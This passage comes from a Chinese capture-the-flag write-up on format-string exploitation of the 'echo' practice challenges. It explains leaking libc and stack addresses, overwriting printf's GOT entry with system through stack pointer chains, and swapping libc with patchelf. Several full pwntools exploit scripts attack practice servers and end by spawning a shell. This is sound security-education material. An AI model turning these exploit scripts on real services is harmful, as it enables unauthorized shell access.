class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-echo3"><a href="#0x03-echo3" class="headerlink" title="0x03 echo3"></a>0x03 echo3</h1><p>这道题的远程快给我打吐了。</p><p>应该是BUU上面环境没配置好，远程怎么都打不通，各种exp都试了也不行，但是远程打题目原平台hackme.inndy却能打通。。。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>第一次接触这类<code>Fmt_bss</code>类型的格式化字符串题目。和前两道题目相比，这道题目</p><ol><li>buf在bss段</li><li>main函数有一处调用了alloca，alloca的参数是个随机值，然后<code>sub esp, eax</code>使得esp被减一个随机的值，导致栈地址比较随机。</li></ol><p>这两点我都是第一次接触，做起来用了挺长时间。</p><p>查阅了大量WP以后，得知这类型(Fmt_bss)的题目有一个套路，就是<code>找跳板</code>，然后覆盖<code>printf_got</code>为<code>system</code>。再传入<code>/bin/sh</code></p><h3 id="找跳板的原因？"><a href="#找跳板的原因？" class="headerlink" title="找跳板的原因？"></a><strong>找跳板的原因？</strong></h3><p><strong>找跳板的原因？</strong>：对于<code>%ac$xn</code>a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。</p><p>即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。</p><h2 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it!"></a>Do it!</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><strong>在开始之前，有一点需要了解</strong>:在打本地的时候，程序默认加载的是本地默认libc，但是打远程的时候，程序则加载远程默认libc。这道题目原题作者给了<code>libc-2.23.so.i386</code>这个libc和我们正常的<code>libc-2.23.so.i386</code>不太一样。但是<code>使用不同的libc运行时，栈结构有差异，而我们找跳板正是利用了栈结构的一些特性，所以在本地调试的时候就需要通过指定libc，产生与远程相同的栈结构</code>。</p><h3 id="遇到的困难-未解决-3月19号已解决。"><a href="#遇到的困难-未解决-3月19号已解决。" class="headerlink" title="遇到的困难 (未解决)//3月19号已解决。"></a>遇到的困难 (未解决)//3月19号已解决。</h3><p><code>非常不幸</code>，尽管我已经下载下来了作者提供的<code>libc-2.23.so.i386</code>，但是我依旧没办法让程序优先加载这个libc，试了许多方法，包括<code>设置LD_PRELOAD</code>、<code>process(&#39;./echo3&#39;,env = {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so.i386&quot;})</code>、<code>软链接</code>、<code>(这么做之前一定要备份原有的libc)删掉/lib/i386-linux-gnu/libc-2.23.so和libc.so.6，然后用作者给的libc替换libc-2.23.so，然后再用软链接搞出来libc.so.6</code></p><p>这些方法都会导致各种各样的报错，比如<code>段错误</code>、不能加载<code>libc-2.23.so.i386</code>之类的。初步推测是这个<code>libc-2.23.so.i386</code>有点问题？</p><p>如果能在本地通过加载作者给的libc来调试，就能得到准确的偏移，远程应该也就能打得通了。</p><p><strong>但是重在学习fmt_bss类题目的打法，拿不拿得到flag就不是那么重要了，本文将写本地打法</strong></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序本身没有<code>system</code>函数，所以需要先泄露libcbase，然后得到system函数。</p><p>同时也需要泄露栈地址，以便我们找跳板。</p><p>通过跳板修改<code>printf_got</code>为<code>system</code></p><p>传入<code>/bin/sh</code>来getshell</p><h3 id="泄露栈地址和libcbase"><a href="#泄露栈地址和libcbase" class="headerlink" title="泄露栈地址和libcbase"></a>泄露栈地址和libcbase</h3><p>由于程序存在<code>alloca</code>并且<code>sub esp, eax</code>，会导致栈地址的变动。不过有一点非常有意思。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200318190827725.png" alt></p><p>写个程序运算一下，可以发现<code>alloca</code>的参数只有如下可能</p><p><code>[&#39;0x10&#39;, &#39;0x20&#39;, &#39;0x30&#39;, &#39;0x40&#39;, &#39;0x50&#39;, &#39;0x1010&#39;, &#39;0x1020&#39;, &#39;0x1030&#39;, &#39;0x1040&#39;, &#39;0x1050&#39;, &#39;0x2010&#39;, &#39;0x2020&#39;, &#39;0x2030&#39;, &#39;0x2040&#39;, &#39;0x2050&#39;, &#39;0x3010&#39;, &#39;0x3020&#39;, &#39;0x3030&#39;, &#39;0x3040&#39;, &#39;0x3050&#39;]</code></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0x20</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1010</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1050</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1030</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2010</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x30</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x50</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x40</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3050</span><span class="number">2047</span><span class="number">0.0165293927649</span></span><br><span class="line">&gt;<span class="number">0x3010</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2020</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1040</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1020</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3020</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x10</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2040</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3030</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3040</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2050</span><span class="number">2048</span><span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2030</span><span class="number">4096</span><span class="number">0.0330749354005</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>从左到右依次是 16进制表示、10进制表示、出现概率。</p><p>我们可以通过多次尝试或者直接在exp里加入控制语句来让这个栈的减少值固定下来。</p><p>在此之前，先来调试一下，看看此时栈有什么特征，以便在exp加入控制语句。</p><p>gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">08048774                 sub     esp, eax</span><br><span class="line">...</span><br><span class="line">08048646                 call    _printf</span><br></pre></td></tr></table></figure><p>在这两处位置下断，执行到第一个断点的时候<code>set $eax = 0x20</code>，使得esp=0x20,当然也可以选取别的值。</p><p>接着执行，到<code>call printf</code>的时候<code>stack 100</code> 查看栈情况。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318191540.png" alt></p><p>能够看到<code>__libc_start_main + 247</code>,此时其偏移为43 可通过<code>%43$p</code>来打印出来。可以发现其特征为后三位为<code>637</code>，选取后三位是因为这三位是不变的，如果虚拟机开了ASLR，除了后三位以外，其他位置都有可能变。</p><p>通过这个能泄露出libcbase，但还需要泄露出栈地址，这里选择偏移为30的这一处</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192148.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29736</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)<span class="comment">#for process()</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')#for remote()</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><h3 id="找跳板"><a href="#找跳板" class="headerlink" title="找跳板"></a>找跳板</h3><p>原理利用了之前讲到的A-&gt;B-&gt;C</p><p>由于刚才已经找到了位于30偏移的栈地址，其地址里存的是位于87偏移的地址，87偏移的地址里面存的是一些其他东西。</p><p>这道题比较巧，栈里面存在<code>_GLOBAL_OFFSET_TABLE_</code>可以覆盖其低位字节来让其指向<code>printf_got</code>。图中这两处偏移分别为20和21</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192806.png" alt></p><p>所以跳板流程可以如下表示，为了看起来更舒服，这里用偏移来代替地址。。</p><p>这里<code>_GLOBAL_OFFSET_TABLE_</code>表示的是存放<code>_GLOBAL_OFFSET_TABLE_</code>的栈地址。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----第一步，利用30-------</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;21</span><br><span class="line">-----第二步，利用87-------</span><br><span class="line">修改前</span><br><span class="line">87-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">修改后</span><br><span class="line">87-&gt;21-&gt;printf_got</span><br><span class="line">----第三步，利用21-------</span><br><span class="line">修改前</span><br><span class="line">21-&gt;printf_got</span><br><span class="line">修改后</span><br><span class="line">21-&gt;printf_got-&gt;system</span><br></pre></td></tr></table></figure><p>可以看出，每一步，对应<code>A-&gt;B-&gt;C</code>中A和B位置的都是指针。</p><p><strong>然而，这样由于printf反馈的数据太多了，大概会运行好几分钟。。。而如果打远程的话，恐怕没这么多时间，而且考虑网络因素，这样就算payload正确也很难打通吧</strong></p><p>因此有了改进的payload，每次修改2字节，这样会大大降低数据量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">----第一步----借助30和31</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">31-&gt;85-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;20</span><br><span class="line">31-&gt;85-&gt;21</span><br><span class="line">----第二步----借助85和87</span><br><span class="line">修改前</span><br><span class="line">85-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">87-&gt;20-&gt;_GLOBAL_OFFSET_TABLE_+4</span><br><span class="line">修改后</span><br><span class="line">87-&gt;20-&gt;printf_got</span><br><span class="line">85-&gt;21-&gt;printf_got + 2</span><br><span class="line">----第三步----借助20和21</span><br><span class="line">修改前</span><br><span class="line">20-&gt;printf_got</span><br><span class="line">21-&gt;printf_got + 2</span><br><span class="line">修改后</span><br><span class="line">20-&gt;printf_got-&gt;system后两字节</span><br><span class="line">21-&gt;printf_got + 2-&gt;system前两字节</span><br><span class="line"></span><br><span class="line">//关于这里字节的前后,更博的时候我自己都绕晕了...记录一下</span><br><span class="line">[+] printf_got = 0x804a014</span><br><span class="line">[+] system = 0xf7e3fda0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/4x 0x804a014</span><br><span class="line">0x804a014:0xa00xfd0xe30xf7</span><br><span class="line">pwndbg&gt; x/wx 0x804a014</span><br><span class="line">0x804a014:0xf7e3fda0</span><br><span class="line">//应该能看明白吧</span><br></pre></td></tr></table></figure><p>第二步挺巧妙的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">0050</span>│  <span class="number">0xffffcfd0</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│  <span class="number">0xffffcfd4</span> —▸ <span class="number">0x804a060</span> (magic) ◂— <span class="number">0xadb5e79a</span></span><br></pre></td></tr></table></figure><p>可以看到0xffffcfd0和0xffffcfd0+4所存的地址都是<code>0x804axxx</code>而正好<code>_GLOBAL_OFFSET_TABLE_</code>为<code>0x804a000</code>，<code>不同函数got值前两字节是不变的，改变的只是后两字节</code>，因此我们才有了每次修改两字节的方法。</p><p><strong>这里还有一个细节，我们来看system。</strong></p><p><code>[+] system = 0xf7e3fda0</code></p><p>可以看出 system的前两字节<code>0xf7e3</code>要小于后两字节<code>0xfda0</code>，再想想我们fmt_payload的构造方法，就能得知要先修改值小的前两字节，然后再修改后两字节。</p><hr><p>所以得到代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',29736)</span></span><br><span class="line">    c = process(<span class="string">"./echo3"</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19日凌晨针对echo3的新更新"><a href="#3月19日凌晨针对echo3的新更新" class="headerlink" title="3月19日凌晨针对echo3的新更新"></a>3月19日凌晨针对echo3的新更新</h1><p>请教了一下大佬，关于之前为什么我没法指定题目给的libc来运行echo3，原来我姿势不对。</p><p>这里贴一下陈大佬的看雪文章<a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p>里面介绍了如何利用<code>patchelf</code>这个工具来更换程序libc。</p><p>主要命令就是两条，以这道题目的<code>echo3</code>和<code>libc-2.23.so.i386</code>为例来说，我们还需要一个<code>ld-2.23.so</code></p><p><strong>！！！注意这个ld-2.23.so不能直接在/lib/i386-linux-gnu/ld-2.23.so取，这个会一直报段错误。。。被这个困扰了好长时间！多亏陈大佬提醒要去glibc all in one 里下载</strong></p><p>然后我们通过patchelf来更换程序的libc</p><p><code>patchelf --set-interpreter ./ld-2.23.so ./echo3</code></p><p><code>patchelf --replace-needed libc.so.6 ./libc-2.23.so.i386 ./echo3</code></p><p>第一条指令是用来修改ld的，第二条指令是用来修改libc的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319013451.png" alt></p><p>改完以后是这样的。</p><p><strong>本地又调了调，调好本地能打通了，但这在BUU上依旧没法打通，不过在hackme.inndy.tw上面打得通</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319020512.png" alt></p><p><strong>只能说BUU上面的libc有些。。奇葩吧,拿不拿得到flag其实也就那样了,关键是通过这道题目学了好多东西,这要比拿再多的flag都要有意义。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png" alt></p><p>和之前的exp相比，就改了一下改printf_got为system的顺序，因为换了libc以后，system的前两个字节要大于后两个字节。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7720</span>)    </span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',27252)</span></span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span 